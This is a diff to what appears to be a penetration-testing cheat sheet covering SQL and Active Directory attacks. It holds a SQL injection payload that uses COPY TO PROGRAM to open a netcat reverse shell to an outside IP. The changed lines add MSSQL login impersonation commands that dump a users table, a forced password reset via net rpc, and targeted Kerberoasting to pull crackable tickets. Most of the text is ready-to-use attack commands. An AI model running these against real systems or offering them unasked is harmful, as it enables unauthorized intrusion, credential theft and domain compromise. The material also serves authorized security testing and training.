@@ -230,12 +230,13 @@ Disk location must be writable. Find a way to execute the php file
 	'; COPY (SELECT '') to program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 123.123.123.1 4444 >/tmp/f';-- - 
 
 ## SQL Misc
-### mssqlpwner
-	mssqlpwner domain/user:password@123.123.123.123 interactive
-Flags: Connect to SQL server in interactive shell  
+### MSSQL Impersonation
+	SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_i WHERE a.permission_name = 'IMPERSONATE'
+Finds all impersonable users  
 
-	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
-Flags: Execute direct query, impersonate as appdev, dump users table  
+	impacket-mssqlclient -windows-auth domain.com/user:pass@domain.com
+	"execute as login = appdev;use databasename;select * from users"
+Impersonate as appdev, dump users table  
 
 ### mysql non-interactive query
 	mysql -u 'root' --password='' -D database -e "SHOW DATABASES"
@@ -696,10 +697,12 @@ Use powerview to see if LAPS are enabled for any machines
 	Find-AdmPwdExtendedRights -Identity * | fl
 See who can see LAPS  
 
-## AD - GenericWrite/GenericAll
-1. Reset password of account: `net rpc password <samAccountName> 'newpassword' -U domain/user%'password' -S dc01.domain.com`
-1. Set account to no-preauth, asrep roast, crack hash  
-1. Set SPN for account, kerberoast, crack hash  
+## AD - GenericAll/ForceChangePassword
+Reset password of account: `net rpc password <samAccountName> 'newpassword' -U domain/user%'password' -S dc01.domain.com`
+
+## AD - GenericWrite
+	python targetedKerberoast.py -v -d 'domain.com' -u 'user' -p 'password'
+Any users subject to GenericWrite will have krbtgs extracted.  
 
 ## AD - GPO GenericWrite
 1. `\\dc1\sysvol\domain.com\Policies\{policyID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl`  
